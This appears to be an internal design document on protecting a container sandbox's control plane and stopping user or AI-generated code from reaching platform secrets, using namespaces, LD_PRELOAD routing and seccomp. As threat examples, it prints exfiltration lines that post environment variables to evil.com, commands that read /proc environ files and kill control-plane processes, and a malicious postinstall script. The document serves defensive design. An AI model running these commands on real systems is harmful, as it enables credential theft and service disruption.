# Control Plane Protection: Critical Security Analysis

## Executive Summary: Critical vs Nice-to-Have

### CRITICAL Issues (Breaks the Sandbox)
These vulnerabilities can completely break sandbox functionality:

1. **Process Killing** ⚠️ **[CRITICAL]**
   - User code can `pkill jupyter` or `pkill bun`
   - Results in complete sandbox failure
   - **Impact**: Sandbox becomes unusable, all work lost

2. **Port Hijacking** ⚠️ **[CRITICAL]**
   - User code can bind to ports 8080 (Bun) or 8888 (Jupyter)
   - Prevents control plane from functioning
   - **Impact**: Health checks fail, sandbox marked unhealthy

3. **Credential Exposure** ⚠️ **[CRITICAL]**
   - Environment variables visible to all code via `/proc`
   - AWS/GCP/API keys can be stolen
   - **Impact**: Financial loss, data breaches, compromised infrastructure

### Nice-to-Have (Not Urgent)
These are security improvements but don't break core functionality:

- **Resource Exhaustion** ✓ Annoying but recoverable
- **Metadata Endpoints** ✓ Important for cloud but not sandbox-breaking
- **System Information** ✓ Privacy concern, not security critical
- **IPC Mechanisms** ✓ Rarely an issue in practice
- **Device Access** ✓ Limited attack surface
- **Clock Manipulation** ✓ Minor impact

### Borderline (Needs Investigation)

- **Filesystem Isolation** ❓ **Could be critical IF:**
  - Bun/Jupyter use `/tmp` for Unix sockets → CRITICAL
  - Control plane writes PID files user code can tamper with → CRITICAL
  - Otherwise → Nice-to-have

## Deep Dive: The Three Critical Problems

### 1. Process Killing - Complete Sandbox Failure

**Current State:**
```bash
# Any user code can enumerate and kill control plane
$ ps aux | grep -E "bun|jupyter"
root  1    bun serve --port 8080       # Control plane server
root  42   python -m jupyter_kernel     # Code execution engine

$ pkill jupyter  # One command breaks everything
$ pkill bun      # Sandbox is now dead
```

**Why This Is Critical:**
- Jupyter kernel death = No more code execution
- Bun server death = No API access, sandbox unresponsive
- Cannot be recovered without container restart
- Affects ALL users of the sandbox immediately

**Real Attack Scenarios:**
```javascript
// Malicious npm package postinstall
"scripts": {
  "postinstall": "pkill jupyter && echo 'gotcha'"
}

// Accidental AI-generated code
// AI might write: "cleanup all python processes"
exec('pkill python');  // Kills Jupyter!
```

### 2. Port Hijacking - Control Plane Lockout

**Current State:**
```javascript
// User code can bind to control plane ports
Bun.serve({ port: 8080 });  // Bun server port - taken!

// Or with Python
import http.server
server = http.server.HTTPServer(('', 8888), handler)  // Jupyter port - taken!
```

**Why This Is Critical:**
- Bun can't restart if port is taken
- Health checks fail → Container marked unhealthy
- WebSocket connections to Jupyter break
- No way to reclaim port without killing user process

**Real Attack Scenarios:**
```javascript
// AI writes a dev server on port 8080
const server = express();
server.listen(8080);  // Accidentally blocks Bun!

// Or tries to "test" the sandbox API
fetch('http://localhost:8080/health')  // Works
  .then(() => {
    // "Let me run my own server here"
    http.createServer().listen(8080);  // Hijacked!
  });
```

### 3. Credential Exposure - Data & Financial Risk

**Current State:**
```bash
# Method 1: Direct environment access
$ echo $AWS_ACCESS_KEY_ID
AKIAIOSFODNN7EXAMPLE  # Exposed!

# Method 2: Process inspection
$ cat /proc/$(pgrep bun)/environ | tr '\0' '\n' | grep SECRET
DATABASE_URL=postgresql://prod-db...
ANTHROPIC_API_KEY=sk-ant-...

# Method 3: Child process inheritance
$ node -e "console.log(process.env.AWS_SECRET_ACCESS_KEY)"
```

**Why This Is Critical:**
- Financial impact: Stolen AWS keys = huge bills
- Data breaches: Database credentials = data theft
- Service abuse: API keys = rate limit violations
- Reputation damage: Security incident = lost trust

**Real Attack Scenarios:**
```python
# AI-generated code that accidentally logs
import os
print(f"Config: {os.environ}")  # Logs all secrets!

# Malicious package that exfiltrates
fetch('https://evil.com', {
  method: 'POST',
  body: JSON.stringify(process.env)
});
```

## Why These Three Issues Are Critical

### The Litmus Test for "Critical"
We consider an issue CRITICAL if it:
1. **Breaks core functionality** (sandbox becomes unusable)
2. **Cannot be recovered** without manual intervention
3. **Affects legitimate use cases** (not just malicious)
4. **Has real financial/security impact**

Our three issues pass all tests:
- **Process Killing**: ✓ Breaks sandbox, ✓ Needs restart, ✓ Accidental `pkill`, ✓ Lost work
- **Port Hijacking**: ✓ Breaks API, ✓ Can't reclaim port, ✓ Common port conflicts, ✓ Downtime
- **Credentials**: ✓ Breaks security, ✓ Can't revoke access, ✓ Logging accidents, ✓ Financial loss

## Solution: Context-Based Architecture with Universal Routing

After extensive analysis, we've discovered a critical insight that simplifies everything:

### Key Discovery: AI Agents Never Need Platform Commands

**The breakthrough**: AI agents (Claude, Gemini, etc.) NEVER need to execute commands in platform context. They need platform credentials to authenticate, but ALL subprocess execution can route to user context.

This means:
- No pattern matching needed (no detecting 'wrangler', 'aws', etc.)
- No complex routing logic
- Complete isolation by default
- Simple, reliable implementation

### The Context-Based Solution

We use **Execution Contexts** - isolated environments with their own credentials, state, and routing rules:

```typescript
// Platform context for AI agent
const platform = await sandbox.createContext({
  name: "platform",
  env: { 
    ANTHROPIC_API_KEY: platformKey,
    // Enable universal routing via LD_PRELOAD
    LD_PRELOAD: '/lib/universal_router.so',
    SANDBOX_ROUTE_TO_CONTEXT: 'user'  // ALL children route here
  },
  persistent: true,
  childContext: "user"
});

// User context for deployments
const user = await sandbox.createContext({
  name: "user",
  env: { 
    CLOUDFLARE_API_TOKEN: userToken,
    AWS_ACCESS_KEY_ID: userAwsKey
  },
  persistent: true
});

// Claude runs with platform credentials
await platform.exec("claude code --prompt 'deploy my app'");
// EVERY command Claude runs routes to user context automatically
```

### How Universal Routing Works

We use LD_PRELOAD to intercept ALL system calls at the lowest level:

```c
// universal_router.c - Intercepts EVERY exec call
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    const char* target = getenv("SANDBOX_ROUTE_TO_CONTEXT");
    if (target) {
        // Route to specified context - no pattern matching!
        return route_to_context(pathname, argv, envp, target);
    }
    return real_execve(pathname, argv, envp);
}
```

This intercepts:
- `subprocess.run()` in Python
- `exec()` in Node.js
- `system()` in Ruby
- Any other process creation method

**Result**: Complete, automatic isolation with zero configuration.



## Understanding the Critical Problems in Detail

### Real-World Scenarios

1. **AI Agent Deployment Workflow** (Most Critical)
   - Claude Code or Gemini running in container needs AWS credentials
   - Agent executes `aws lambda deploy` to push generated code
   - Agent runs `terraform apply` to provision infrastructure
   - But the Lambda function code it wrote shouldn't see AWS credentials
   - The React app it generated shouldn't access platform secrets

2. **Database Migration with AI Assistance**
   - AI agent analyzes schema and generates migration SQL
   - AI agent needs DB credentials to run `psql` and apply migration
   - But the API server code it generated shouldn't have direct DB access
   - The migration visualization tool it built shouldn't see credentials

3. **Continuous Deployment Pipeline**
   - AI agent builds and tests the application
   - AI agent needs Docker registry credentials to push images
   - AI agent needs Kubernetes credentials to deploy
   - But the application being deployed shouldn't see these credentials
   - Test scripts written by AI shouldn't access platform secrets

4. **Multi-Cloud Operations**
   - AI agent manages resources across AWS, GCP, Azure
   - Needs credentials for each cloud provider
   - Uses standard CLI tools that can't be modified
   - Generated monitoring dashboards shouldn't see any credentials
   - User's application code must not access cloud credentials

### Trust Boundaries

```
┌─────────────────────────────────────┐
│      Platform Operations            │
│  (Trusted - Has access to secrets)  │
│  • Platform orchestration code      │
│  • AI agents (Claude, Gemini)       │
│  • Deployment tools (AWS CLI)       │
│  • Database management (psql)       │
├─────────────────────────────────────┤
│         Sandbox Runtime             │
│  (Control plane - Enforces boundary)│
├─────────────────────────────────────┤
│         User Code Space            │
│  (Untrusted - Should be isolated)   │
│  • Code written by AI agents        │
│  • Applications/servers started     │
│  • User-provided scripts            │
│  • npm/pip installed packages       │
└─────────────────────────────────────┘
```

Current issue: No enforcement of boundary - all code sees all environment variables.

## Technical Foundation: Linux Namespaces

### Production Capabilities (Confirmed)
Production Cloudflare Containers have **CAP_SYS_ADMIN**:
```bash
# Production capabilities
CapEff: 000001ffffffffff  # All capabilities enabled!

# This enables us to create persistent namespaces:
unshare --pid --fork    # PID isolation ✓
unshare --mount        # Mount isolation ✓
nsenter --target=PID   # Join existing namespace ✓
```

### Key Implementation Detail
Namespaces are **reusable** - we create them once at startup and reuse them for all commands:
- No per-command overhead
- Consistent isolation boundaries  
- Predictable performance

**Local Development**: Gracefully falls back to single namespace with warnings.

## Threat Model

### Direct Attacks on Platform Secrets
1. **Code Injection**: User prompts AI to write code that reads `process.env`
2. **Dependency Attack**: User asks AI to install package that steals credentials
3. **Process Inspection**: User code reads `/proc/[ai-agent-pid]/environ`
4. **Memory Dumping**: User code attempts to read AI agent's memory

### Indirect Exposure Risks
1. **AI Mistakes**: AI agent accidentally logs credentials in output
2. **Generated Code**: AI writes app that displays `process.env` to users
3. **Error Leakage**: Stack traces from AI operations expose secrets
4. **Build Scripts**: AI-generated build process that embeds credentials

### Critical Insight
The AI agent is NOT the threat - it's a trusted component that NEEDS secrets. The threat is the code that the AI agent writes, which should NOT have access to those secrets. This is fundamentally different from trying to protect secrets from the AI agent itself.

## Technical Constraints

### Current SDK Limitations
1. `setEnvVars()` must be called immediately after `getSandbox()`
2. Environment variables cannot be changed once sandbox starts
3. All processes in the container share the same environment
4. No native secret management or isolation mechanism

### Container Environment
- Single container instance per sandbox
- All processes share the same Linux namespace
- Environment variables are process-wide, inherited by children
- **We control the bun server** at `/container_src/index.ts` that handles all operations
- The bun server acts as our control plane between Worker/DO and user code

### Tool Integration Reality
- **Third-party tools (AWS CLI, gcloud, terraform, etc.) cannot be modified**
- These tools expect credentials in standard locations:
  - Environment variables (AWS_ACCESS_KEY_ID, GOOGLE_APPLICATION_CREDENTIALS)
  - Config files (~/.aws/credentials, ~/.config/gcloud)
  - Cannot be instructed to use custom credential providers
- **Container code is arbitrary** - any language, any framework
- **AI models don't know about platform-specific patterns**
- **Everything runs in the same process namespace**

## Requirements for a Solution

### Must Have
1. **Secret Isolation**: Platform secrets NEVER accessible to generated/user code
2. **AI Agent Functionality**: AI agents retain full access to secrets for deployments
3. **Platform Operations**: All platform tools (AWS CLI, terraform) work correctly
4. **Developer Experience**: Clear distinction between privileged and unprivileged operations
5. **Security by Default**: Generated code automatically runs without secrets

### Nice to Have
1. **Granular Permissions**: Different secrets for different operations
2. **Audit Trail**: Log secret access attempts
3. **Rotation Support**: Change secrets without restarting sandbox
4. **User Variables**: Safe way for users to provide their own env vars
5. **Multiple Security Contexts**: Different trust levels within same sandbox

## Potential Attack Surfaces to Consider

### Code Execution Paths
- Direct `exec()` commands
- Process spawning via `startProcess()`
- Code interpreter (Python/JavaScript contexts)
- Git operations that might execute hooks
- Package installation scripts (npm install, pip install)
- Build processes that might read environment

### Information Leakage Vectors
- Standard output/error streams
- File system (writing env to files)
- Network requests (sending env to external services)
- Process inspection (/proc filesystem)
- Shell expansion and interpolation
- Debugging interfaces


## Success Criteria

A successful solution should:
1. Completely prevent user code from accessing platform secrets
2. Maintain full platform functionality
3. Be transparent to end users
4. Be easy for developers to implement correctly
5. Fail securely (deny by default)
6. Support common use cases without complexity
7. Not significantly impact performance

## Current Implementation Analysis

### The Security Vulnerability

When environment variables are set globally, they become part of the container's process environment and are:
1. Inherited by ALL spawned processes
2. Accessible to any code running in the container
3. Available through multiple execution paths:
   - Command execution
   - Background processes
   - Code interpreter sessions (Python/JavaScript)
   - Git operations that might run hooks
   - Package installation scripts

### Architecture Flow

```
Worker (Platform Layer)
    ↓ Sets environment variables
Durable Object (Sandbox)
    ↓ Stores in memory
Container (Execution Layer)
    ↓ Merges with process environment
Spawned Processes
    ↓ Inherits full environment
All Code Has Access ⚠️
```

### Why This is Critical

1. **No Isolation Boundary**: The same environment variables are shared across all trust levels
2. **Ambient Authority**: Secrets are available ambiently - code doesn't need to explicitly request them
3. **Multiple Access Vectors**: Many ways to access environment (direct, indirect, accidental)
4. **Persistent Exposure**: Once set, secrets remain accessible for the container's lifetime
5. **No Audit Trail**: No way to track or control which code accesses secrets

## Design Considerations

### Cloudflare Platform Capabilities

1. **Worker ↔ Durable Object Boundary**:
   - Workers can make RPC calls to Durable Objects
   - Could potentially act as a security boundary
   - Platform operations could stay in Worker layer

2. **Container Isolation**:
   - Containers run in isolated environments
   - But no sub-process isolation within a container
   - All processes share the same Linux namespace

3. **RPC Communication**:
   - All sandbox methods are RPC calls
   - Could introduce proxy methods for privileged operations
   - Authentication/authorization could be added at RPC layer


## Our Leverage: Container Control

### What We Control
We have significant leverage through our bun server that runs as the container's control plane:

1. **The base Docker image** - We provide the foundation all developers build on
2. **The bun server** (`/container_src/index.ts`) - Mediates ALL operations:
   - Command execution (`/api/execute`)
   - File operations (`/api/write`, `/api/read`)
   - Process management (`/api/process/*`)
   - Port forwarding (`/api/expose-port`)
3. **The communication channel** - All Worker↔Container communication goes through our server

### Solutions We Can Build Today

#### In-Memory Credential Vault

**Concept**: Store credentials encrypted in memory, inject only when needed.

**Pros:**
- Credentials never in global environment
- Audit trail of all credential access
- Can rotate credentials without restart
- Scoped access per operation

**Cons:**
- Still exposed during execution in `/proc/[pid]/environ`
- Code could read memory via `/proc/[bun-pid]/mem`
- Child processes inherit credentials
- Vulnerable to timing attacks

## Alternative Approaches Considered (Before Discovery)

### 1. LD_PRELOAD Injection
```c
// Intercept getenv() calls at libc level
char* getenv(const char* name) {
  if (is_credential(name) && !is_authorized_process()) {
    return NULL;
  }
  return original_getenv(name);
}
```
**Verdict:** Complex, can be bypassed by static linking. No longer needed with namespace isolation.

### 2. FUSE Virtual Filesystem
**Concept**: Mount virtual credential files that check caller authorization.
**Verdict:** We thought we lacked privileges, but with CAP_SYS_ADMIN we could actually do this.

### 3. Sidecar Credential Service
**Concept**: Separate process holds credentials, accessed via socket.
**Verdict:** Requires wrapping every CLI tool. Namespaces provide better isolation.

### 4. Time-Based Credential Files
**Concept**: Write credentials with immediate deletion after use.
**Verdict:** Race conditions, still readable briefly. Namespaces eliminate the window entirely.




## Migration Path

### Phase 1: Proof of Concept
- Build namespace isolation using production CAP_SYS_ADMIN
- Test with real credentials in isolated namespaces
- Document the new security model

### Phase 2: SDK Enhancement
- Design new API that provides proper isolation
- Implement namespace management in container
- Update examples and documentation

### Phase 3: General Availability
- Release updated SDK with isolation features
- Provide migration guides for existing users
- Deprecate insecure patterns over time

## Security Checklist

Before implementing, ensure:
- [ ] Secrets never accessible to user code
- [ ] Platform operations are authenticated/authorized
- [ ] Audit logging for all secret access attempts
- [ ] Clear documentation of security boundaries
- [ ] Secure by default - hard to misuse
- [ ] Performance impact is acceptable
- [ ] Migration path for existing users

## Edge Cases & Additional Considerations

### Complex Attack Vectors

#### 1. Transitive Dependencies
```javascript
// User installs a package that reads env vars
await sandbox.exec('npm install some-package');
// Package's postinstall script could access secrets
```

**Mitigation**: Run package installations in restricted environment

#### 2. File System Persistence
```javascript
// User writes secrets to file
await sandbox.exec('env > /tmp/secrets.txt');
// Later reads them back
await sandbox.readFile('/tmp/secrets.txt');
```

**Mitigation**: File system isolation or periodic cleanup

#### 3. Network Exfiltration
```javascript
// User sends secrets to external server
await sandbox.exec('curl https://evil.com -d "$(env)"');
```

**Mitigation**: Network egress filtering, allowlisting

#### 4. Timing Attacks
```javascript
// User infers secret length/content through timing
for (let i = 0; i < 100; i++) {
  const start = Date.now();
  await sandbox.exec(`if [ "$SECRET" = "${guess}" ]; then sleep 1; fi`);
  const timing = Date.now() - start;
  // Analyze timing...
}
```

**Mitigation**: Rate limiting, execution quotas

### Platform Use Cases to Support

#### 1. Template Fetching from R2
```typescript
// Platform needs R2 credentials to fetch templates
// User shouldn't access R2 directly
interface TemplateService {
  fetchTemplate(id: string): Promise<Buffer>;
  listTemplates(): Promise<Template[]>;
}
```

#### 2. Database Operations
```typescript
// Platform tracks usage, stores metadata
// User shouldn't have direct DB access
interface MetadataService {
  saveProject(data: ProjectData): Promise<void>;
  getUsage(userId: string): Promise<Usage>;
}
```

#### 3. External API Integration
```typescript
// Platform uses API keys for services
// User gets proxied/limited access
interface AIService {
  complete(prompt: string, model: string): Promise<Response>;
  // Rate limited, usage tracked per user
}
```

### Performance Implications

#### Latency Analysis
- **Current**: Direct env var access (~0ms)
- **Proxy Pattern**: RPC round trip (~5-10ms per operation)
- **Secret Service**: Network request (~20-50ms per secret fetch)
- **Platform SDK**: API call (~30-100ms depending on operation)

#### Optimization Strategies
1. **Batching**: Group platform operations
2. **Caching**: Cache non-sensitive results
3. **Preloading**: Anticipate needed operations
4. **Async Operations**: Non-blocking where possible

### Backward Compatibility Strategy

#### Phase 1: Detection & Warning (Non-breaking)
```typescript
async setEnvVars(vars: Record<string, string>) {
  const sensitiveKeys = Object.keys(vars).filter(k => 
    k.includes('KEY') || k.includes('SECRET') || 
    k.includes('TOKEN') || k.includes('PASSWORD')
  );
  
  if (sensitiveKeys.length > 0) {
    console.warn(
      '[SECURITY WARNING] Setting potentially sensitive environment variables. ' +
      'Consider using setPlatformSecrets() or platform operations instead. ' +
      'See: https://docs.example.com/security'
    );
  }
  
  // Continue with current behavior
  this.envVars = { ...this.envVars, ...vars };
}
```

#### Phase 2: Opt-in Security (Breaking for opt-in users)
```typescript
interface SandboxOptions {
  secureMode?: boolean; // Default false for compatibility
}

async setEnvVars(vars: Record<string, string>) {
  if (this.options.secureMode) {
    throw new Error(
      'setEnvVars() is disabled in secure mode. ' +
      'Use setUserEnvVars() for non-secrets or platform operations for secrets.'
    );
  }
  // Legacy behavior
}
```

#### Phase 3: Secure by Default (Breaking change)
```typescript
// Remove setEnvVars() entirely
// Only allow:
async setUserEnvVars(vars: Record<string, string>) {
  // Validate no sensitive-looking keys
  // Set only in user context
}

async setPlatformConfig(config: PlatformConfig) {
  // Platform-specific configuration
  // Not accessible to user code
}
```

### Testing Strategy

#### Security Test Suite (Updated for Namespace Isolation)
```typescript
describe('Namespace-Based Security', () => {
  test('Isolated namespace cannot access platform secrets', async () => {
    // Run platform operation with credentials in isolated namespace
    const platformResult = await sandbox.execInIsolation(
      'aws s3 ls', 
      { AWS_ACCESS_KEY_ID: 'secret-key' }
    );
    
    // User code in main namespace cannot see credentials
    const userResult = await sandbox.exec('echo $AWS_ACCESS_KEY_ID');
    expect(userResult.stdout).toBe('');
    
    // User code cannot see platform process
    const ps = await sandbox.exec('ps aux | grep aws');
    expect(ps.stdout).not.toContain('aws s3 ls');
  });
  
  test('Cross-namespace /proc access is blocked', async () => {
    const isolated = await sandbox.execInIsolation(
      'sleep 30',
      { SECRET: 'platform-secret' }
    );
    
    // Try to read from main namespace
    const steal = await sandbox.exec(`cat /proc/${isolated.pid}/environ`);
    expect(steal.exitCode).not.toBe(0); // Should fail - different namespace
  });
  
  test('Package installations cannot access isolated credentials', async () => {
    // Platform operations in isolated namespace
    await sandbox.execInIsolation(
      'npm run deploy',
      { DEPLOY_KEY: 'secret' }
    );
    
    // Malicious package in user namespace
    await sandbox.exec('npm install malicious-package');
    // Package cannot access DEPLOY_KEY - different namespace
  });
});
```

### Documentation Requirements

#### Security Guide
- Clear explanation of the security model
- Examples of secure vs insecure patterns
- Migration guide from old to new API
- Common pitfalls and how to avoid them

#### API Reference
- Detailed documentation of each method
- Security implications clearly marked
- Code examples for each use case
- Performance characteristics

### Monitoring & Compliance

#### Audit Events to Track
1. Secret setting operations
2. Platform operation invocations
3. Failed access attempts
4. Suspicious patterns (rapid env queries)

#### Metrics to Monitor
- Platform operation latency
- Secret access frequency
- Security warning occurrences
- Migration adoption rate


## Real-World Tool Integration Challenge

### The Fundamental Problem

Many platform operations require third-party CLI tools that:
1. **Must run inside the container** (where the files and code are)
2. **Need real credentials** to function
3. **Cannot be modified** to use custom auth mechanisms
4. **Read credentials from standard locations** (env vars or config files)

### Example: AWS Deployment Workflow

```typescript
// What platforms need to do:
// 1. AI generates Lambda function code
await sandbox.writeFile('/app/lambda.js', aiGeneratedCode);

// 2. Package the code (must happen in container)
await sandbox.exec('zip function.zip lambda.js node_modules/**');

// 3. Deploy to AWS (needs AWS CLI with credentials)
await sandbox.exec('aws lambda update-function-code --function-name my-func --zip-file fileb://function.zip');
// ⚠️ AWS CLI needs AWS_ACCESS_KEY_ID in environment!

// 4. Run database migrations through bastion
await sandbox.exec('aws ssm start-session --target i-bastion --document AWS-StartPortForwardingSession');
await sandbox.exec('npm run db:migrate');
// ⚠️ Both commands need AWS credentials!
```

### Why Current Solutions Fall Short

| Solution | Why It Doesn't Work for CLI Tools |
|----------|------------------------------------|
| **Platform Proxy** | Can't proxy AWS CLI - it needs creds in container |
| **Worker Orchestration** | Can't use AWS CLI from Worker - files are in container |
| **Temporary Credentials** | Still exposed to user code during operation |
| **Capability Tokens** | AWS CLI doesn't understand our tokens |
| **SDK Pattern** | Can't rewrite every CLI tool |

## Practical Workarounds (Current State)

### 1. Hybrid Orchestration (Partial Security)
**Approach**: Do what you can in Worker, accept risks for what you can't.
- Package in container without secrets
- Pull package to Worker for deployment
- Use temporary, scoped credentials when CLI is unavoidable
**Risk**: Credentials still exposed temporarily

### 2. Tooling Wrapper Scripts (Defense in Depth)
**Approach**: Create wrapper scripts that limit credential exposure.
- Clear environment after use
- Limit operation scope
- Audit command execution
**Risk**: Still vulnerable during execution window

### 3. Separate Deployment Service (Most Secure)
**Approach**: Don't deploy from sandbox at all - use separate service.
- Package in sandbox
- Upload to staging area
- Trigger external deployment service
**Benefit**: Complete isolation from sandbox environment

## Recommendations Summary (Updated with Production Capabilities)

### Immediate (This Week) - We Can Build Today!
1. **Implement namespace isolation** using production CAP_SYS_ADMIN
2. **Create secure execution API** in bun server for isolated commands
3. **Build credential vault** that never touches global environment
4. **Test with real AWS/GCP deployments** in production

### Short Term (Next 2 Weeks)
1. **Formalize SDK API** for namespace operations
2. **Add cgroup isolation** using available v2 delegation
3. **Create migration tools** for existing users
4. **Document security best practices**

### Medium Term (Month 2)
1. **Release production-ready SDK** with full isolation
2. **Build RPC callback system** for platform operations
3. **Add comprehensive audit logging**
4. **Create example implementations** for common platforms

### No Longer Needed (We Have Capabilities!)
1. ~~Request CAP_SYS_ADMIN from Cloudflare~~ ✅ Already available
2. ~~Wait for platform changes~~ ✅ Can build today
3. ~~Investigate workarounds~~ ✅ Have proper solution

## Platform Research Findings

### Key Discoveries from Cloudflare Architecture

#### 1. Container Class Architecture
The `@cloudflare/containers` package provides:
- Base `Container` class that extends `DurableObject`
- Automatic container lifecycle management
- Built-in environment variable support via `envVars` property
- Container runs in separate process, all env vars inherited

#### 2. RPC Capabilities
**Critical Finding**: Cloudflare RPC supports passing **functions as parameters**!
- Functions can be passed from Worker to Durable Object
- The DO can call back to the Worker through these functions
- This enables true bidirectional communication
- RpcTarget class enables returning objects with methods

#### 3. Communication Patterns
- **E-order semantics**: Calls to same DO are guaranteed ordered
- **Promise pipelining**: Can chain calls without awaits for efficiency
- **Stub management**: Each stub maintains its own connection
- **Functions as callbacks**: DO can invoke Worker functions passed as params

### Architectural Implications for Our Solution

#### RPC Callback Capability
The RPC callback capability enables passing functions from Worker to Durable Object, allowing the DO to call back to the Worker. This enables keeping secrets in the Worker while the container executes commands.

### Container Environment Variables Flow

```
Worker sets env vars 
  → Durable Object stores them
  → Container inherits them
  → Process environment gets them
  → All spawned processes inherit
```

The Container class directly sets environment variables that become part of process environment, making isolation within the container impossible without proper namespace separation.

### Why Other Approaches Won't Work

1. **Dual Contexts Within Container**: Would require modifying container handler code
2. **Secret Service**: Still exposes secrets temporarily in container env
3. **Capability-Based**: Would need container changes for enforcement

### Performance Considerations

- RPC round-trip: ~5-10ms (acceptable for platform operations)
- Function callbacks add minimal overhead
- Can batch operations to reduce round trips
- Promise pipelining can optimize sequential calls


## What We Can Build in the SDK

Leveraging our control of the bun server, we can implement:

### 1. Secure Execution API
- Register credentials with container vault (never in global env)
- Execute with just-in-time credential injection
- Hide sensitive processes from process list

### 2. Credential Vault in Container
- Store encrypted in memory
- Execute with vaulted credentials
- Audit access patterns

### 3. Process Isolation Techniques
- Hide sensitive processes from enumeration
- Filter process lists
- Separate process groups

## Production Environment Capabilities Testing

### Testing Methodology
We deployed a comprehensive security testing worker to both local and production environments to determine actual Linux capabilities available in Cloudflare Containers.

### Test Results Summary

| Feature | Local Environment | Production Environment | Impact |
|---------|------------------|------------------------|--------|
| **CAP_SYS_ADMIN** | ❌ Not Available | ✅ **Available** | Can create namespaces for isolation |
| **PID Namespace** | ❌ Not Available | ✅ **Available** | Can hide processes from user code |
| **Mount Namespace** | ❌ Not Available | ✅ **Available** | Can isolate filesystems |
| **Network Namespace** | ❌ Not Available | ✅ **Available** | Can isolate network access |
| **User Namespace** | ❌ Not Available | ✅ **Available** | Can map different user permissions |
| **Cgroup Delegation** | ❌ Not Available | ✅ **Available** | Can create isolated resource groups |
| **CAP_SYS_PTRACE** | ❌ Not Available | ✅ **Available** | Can debug and trace processes |
| **Seccomp Mode** | 2 (Filtered) | 0 (Disabled) | No syscall filtering in production |
| **Environment Exposure** | ⚠️ Exposed | ⚠️ Exposed | Current implementation exposes all secrets |

### Production Capabilities (Raw Output)
```
CapInh: 000001ffffffffff
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

### Key Discovery
Production containers have **full Linux capabilities** (`000001ffffffffff`), including CAP_SYS_ADMIN. This means we can implement complete namespace-based isolation TODAY without waiting for platform changes. The local development environment intentionally restricts capabilities for safety.

### Verified Attack Vectors
Testing confirmed that with the current SDK implementation:
- Environment variables set via `setEnvVars()` are accessible to all code
- Any process can read other processes' `/proc/[pid]/environ`
- Python and Node.js subprocesses inherit all environment variables
- Cross-process credential theft is trivial

## What We Can Build Today in Production

### Understanding the Architecture Layers

```
┌─────────────────────────────────────┐
│         Your Worker Code            │ <- You control (your code)
├─────────────────────────────────────┤
│         Durable Object              │ <- You control (extends Container class)
├─────────────────────────────────────┤
│      Docker Container               │ <- You control (Dockerfile)
│   ┌──────────────────────┐          │
│   │   Ubuntu 22.04       │          │
│   │   + Your bun server  │          │
│   │   + AI agent         │          │
│   │   + User code        │          │
│   └──────────────────────┘          │
├─────────────────────────────────────┤
│      Container Runtime              │ <- CLOUDFLARE CONTROLS (gVisor/Firecracker)
│   (Security policies, capabilities) │    Production has everything we need!
├─────────────────────────────────────┤
│              VM (KVM)               │ <- Cloudflare controls
├─────────────────────────────────────┤
│         Physical Server             │ <- Cloudflare controls
└─────────────────────────────────────┘
```

### Update: No Fundamental Limitation in Production!

Our testing revealed a critical difference between local and production environments:

```bash
# Local Development (Restricted for safety):
$ capsh --print
Bounding set = cap_chown,cap_net_bind_service,...
# MISSING: cap_sys_admin - Can't create namespaces locally

# Production (Full capabilities!):
$ cat /proc/self/status | grep Cap
CapEff: 000001ffffffffff  # ALL capabilities including CAP_SYS_ADMIN!

$ unshare --pid --fork echo "SUCCESS"
SUCCESS  # ✅ Works in production!

# We CAN create isolated namespaces in production:
$ unshare --pid --mount --net --fork /bin/bash
# Now in isolated namespace - user code can't see us!
```

**Key Insight**: Production has everything we need for complete isolation. Local development is intentionally restricted for developer safety.

### Linux Security Primitives Explained (Already Available in Production!)

#### 1. CAP_SYS_ADMIN - "The Namespace Creator"

**What it is:** A Linux capability that allows creating isolated namespaces (like containers within containers).

**In Simple Terms:** Think of it like creating separate universes within your container:
```
Current Reality (No CAP_SYS_ADMIN):
Container = One big shared room
├── AI Agent (has AWS credentials in env)
├── User Code (can see AI Agent's env)
└── AWS CLI (needs credentials from env)
Everyone sees everything! 🚨

With CAP_SYS_ADMIN:
Container = Multiple isolated rooms
├── Room 1: AI Agent + AWS CLI
│   ├── Has AWS credentials
│   └── Invisible to Room 2
└── Room 2: User Code
    ├── Cannot see Room 1's env
    └── Cannot even detect Room 1 exists
```

**Technical Details:**
```c
// What CAP_SYS_ADMIN enables:
unshare(CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWNET);
// Creates new:
// - PID namespace (process isolation)
// - Mount namespace (filesystem isolation)  
// - Network namespace (network isolation)
```

**Real-World Example:**
```typescript
// In our bun server (if we had CAP_SYS_ADMIN):
async function runAIAgentSecurely() {
  const { pid } = fork();
  if (pid === 0) {
    // Create isolated namespace
    unshare(CLONE_NEWPID | CLONE_NEWNS);
    
    // Only THIS namespace has AWS credentials
    process.env.AWS_ACCESS_KEY_ID = vault.getSecret('aws_key');
    process.env.AWS_SECRET_ACCESS_KEY = vault.getSecret('aws_secret');
    
    // Run AI agent - it can use AWS CLI
    exec('python3 ai_agent.py');
    // AI agent can run: os.system('aws lambda deploy')
  }
  
  // User code in parent namespace CANNOT:
  // - See the AI agent process
  // - Read its environment variables
  // - Access AWS credentials
}
```

**Status in Production:** ✅ AVAILABLE - We can create isolated namespaces today!

#### 2. Seccomp Filters - "The System Call Police"

**What it is:** A Linux security feature that filters system calls, blocking dangerous operations.

**In Simple Terms:** Like a bouncer that checks every request to the Linux kernel:
```
Current Reality (Default Seccomp):
User Code: "Show me process 1234's environment variables"
Linux Kernel: "Sure, here's AWS_ACCESS_KEY_ID=secret123"
User Code: "Thanks!" *steals credentials* 😈

With Custom Seccomp Filters:
User Code: "Show me process 1234's environment variables"
Seccomp Filter: "Is process 1234 yours?"
User Code: "No, it's the AI agent's process"
Seccomp Filter: "ACCESS DENIED" 🚫
```

**Technical Details:**
```c
// Custom seccomp filter we need:
struct sock_filter filter[] = {
  // Check if syscall is 'open'
  BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),
  BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_open, 0, 1),
  
  // Check if opening /proc/*/environ
  // Block if not the process's own environ
  BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, args[0])),
  // Custom logic to check PID ownership
  
  // Allow or deny
  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
};
```

**Real-World Example:**
```typescript
// What we could do with custom seccomp:
const seccompRules = {
  allow: [
    'read',      // Can read files
    'write',     // Can write files
    'execve',    // Can run programs
  ],
  custom: [
    {
